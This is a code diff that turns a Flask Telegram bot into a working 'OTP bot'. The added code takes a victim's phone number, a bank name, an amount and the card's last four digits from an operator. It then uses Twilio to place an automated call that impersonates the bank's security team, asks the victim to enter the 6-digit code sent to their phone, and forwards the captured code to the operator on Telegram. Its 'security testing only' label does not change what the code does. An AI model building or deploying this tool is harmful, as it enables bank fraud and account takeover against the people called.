@@ -2,65 +2,147 @@ import os
 import json
 import requests
 from flask import Flask, request
+from twilio.rest import Client
 
 app = Flask(__name__)
-TELEGRAM_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
-BASE_URL = "https://otp-getter.onrender.com"
 
-# Helper function to send Telegram messages
+# ==================== CONFIGURATION ====================
+TELEGRAM_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
+TWILIO_SID = os.environ.get('TWILIO_ACCOUNT_SID')
+TWILIO_AUTH = os.environ.get('TWILIO_AUTH_TOKEN')
+TWILIO_FROM = os.environ.get('TWILIO_FROM_NUMBER')
+BASE_URL = os.environ.get('RENDER_URL', 'https://otp-getter.onrender.com')
+
+# Store user conversation state
+user_data = {}
+
+# Helper: Send Telegram message
 def send_telegram_message(chat_id, text):
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
-    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
     try:
-        response = requests.post(url, json=payload)
-        print(f"Sent message to {chat_id}: {response.status_code}")
+        requests.post(url, json={"chat_id": chat_id, "text": text})
     except Exception as e:
-        print(f"Error sending message: {e}")
+        print(f"Telegram error: {e}")
 
-# ==================== FLASK WEBHOOK ====================
+# Helper: Make Twilio call
+def make_twilio_call(to_number, bank_name, amount, card_last4, chat_id):
+    client = Client(TWILIO_SID, TWILIO_AUTH)
+    voice_url = f"{BASE_URL}/voice?bank={bank_name}&amount={amount}&card_last4={card_last4}&chat_id={chat_id}"
+    call = client.calls.create(to=to_number, from_=TWILIO_FROM, url=voice_url, method='POST')
+    return call.sid
+
+# ==================== FLASK VOICE WEBHOOK ====================
+@app.route("/voice", methods=['GET', 'POST'])
+def voice():
+    from twilio.twiml.voice_response import VoiceResponse, Gather
+    response = VoiceResponse()
+    
+    if 'Digits' in request.values:
+        digits = request.values['Digits']
+        chat_id = request.args.get('chat_id')
+        if chat_id:
+            send_telegram_message(chat_id, f"✅ OTP captured: {digits}")
+        response.say("Thank you. Goodbye.")
+        response.hangup()
+        return str(response)
+    
+    bank_name = request.args.get('bank', 'your bank')
+    amount = request.args.get('amount', '500')
+    card_last4 = request.args.get('card_last4', '1234')
+    
+    gather = Gather(num_digits=6, action='/voice', method='POST', timeout=10)
+    gather.say(f"Hello. This is an automated security call from {bank_name}.")
+    gather.say(f"We detected a transaction of {amount} dollars on card ending in {card_last4}.")
+    gather.say("Please enter the 6-digit code sent to your phone.")
+    response.append(gather)
+    
+    return str(response)
+
+# ==================== TELEGRAM WEBHOOK ====================
 @app.route("/webhook", methods=['POST'])
 def webhook():
     try:
-        # Get the update from Telegram
         update = request.get_json(force=True)
-        print(f"Webhook received: {json.dumps(update)[:200]}...")
+        print(f"Webhook: {json.dumps(update)[:200]}")
         
-        # Extract message details
         message = update.get('message', {})
-        chat = message.get('chat', {})
-        chat_id = chat.get('id')
-        text = message.get('text', '')
+        chat_id = message.get('chat', {}).get('id')
+        text = message.get('text', '').strip()
         
         if not chat_id:
-            print("No chat_id found in update")
             return "ok", 200
         
-        # Handle commands
+        # Initialize user session
+        if chat_id not in user_data:
+            user_data[chat_id] = {'step': 'idle'}
+        
+        state = user_data[chat_id]
+        
+        # Handle /start
         if text == '/start':
-            print(f"Handling /start for chat {chat_id}")
             send_telegram_message(chat_id, "🔐 *OTP Testing Bot*\n\nSend /call to start.\n\n*For security testing only.*")
+            user_data[chat_id] = {'step': 'idle'}
+        
+        # Handle /call
         elif text == '/call':
-            print(f"Handling /call for chat {chat_id}")
-            send_telegram_message(chat_id, "📞 Send phone number (e.g., +447123456789)")
+            send_telegram_message(chat_id, "📞 Send phone number (with country code, e.g., +447123456789)")
+            user_data[chat_id] = {'step': 'awaiting_phone'}
+        
+        # Handle phone number
+        elif state.get('step') == 'awaiting_phone':
+            user_data[chat_id]['phone'] = text
+            user_data[chat_id]['step'] = 'awaiting_bank'
+            send_telegram_message(chat_id, "🏦 Send bank name (e.g., Chase, Santander)")
+        
+        # Handle bank name
+        elif state.get('step') == 'awaiting_bank':
+            user_data[chat_id]['bank'] = text
+            user_data[chat_id]['step'] = 'awaiting_amount'
+            send_telegram_message(chat_id, "💰 Send transaction amount (e.g., 1299.99)")
+        
+        # Handle amount
+        elif state.get('step') == 'awaiting_amount':
+            user_data[chat_id]['amount'] = text
+            user_data[chat_id]['step'] = 'awaiting_card_last4'
+            send_telegram_message(chat_id, "💳 Send last 4 digits of card number")
+        
+        # Handle card last 4 and make the call
+        elif state.get('step') == 'awaiting_card_last4':
+            user_data[chat_id]['card_last4'] = text
+            phone = user_data[chat_id]['phone']
+            bank = user_data[chat_id]['bank']
+            amount = user_data[chat_id]['amount']
+            card_last4 = user_data[chat_id]['card_last4']
+            
+            send_telegram_message(chat_id, f"📞 Calling {phone}...\nBank: {bank}\nAmount: ${amount}\nCard ending: {card_last4}")
+            
+            try:
+                call_sid = make_twilio_call(phone, bank, amount, card_last4, chat_id)
+                send_telegram_message(chat_id, f"✅ Call initiated! SID: {call_sid}\n\nWaiting for OTP entry...")
+            except Exception as e:
+                send_telegram_message(chat_id, f"❌ Call failed: {str(e)}")
+            
+            user_data[chat_id] = {'step': 'idle'}
+        
+        # Handle unknown
         else:
-            print(f"Unknown command: {text}")
+            send_telegram_message(chat_id, "Send /start to begin, or /call to start a new OTP test.")
         
         return "ok", 200
         
     except Exception as e:
-        print(f"Error in webhook: {e}")
+        print(f"Webhook error: {e}")
         return "error", 500
 
-@app.route("/", methods=['GET'])
+@app.route("/")
 def index():
     return "OTP Bot is running."
 
-@app.route("/health", methods=['GET'])
+@app.route("/health")
 def health():
     return "OK", 200
 
 if __name__ == "__main__":
     port = int(os.environ.get('PORT', 5000))
-    print(f"Starting bot on port {port}")
-    print(f"Bot token configured: {bool(TELEGRAM_TOKEN)}")
+    print(f"Starting OTP bot on port {port}")
     app.run(host='0.0.0.0', port=port)
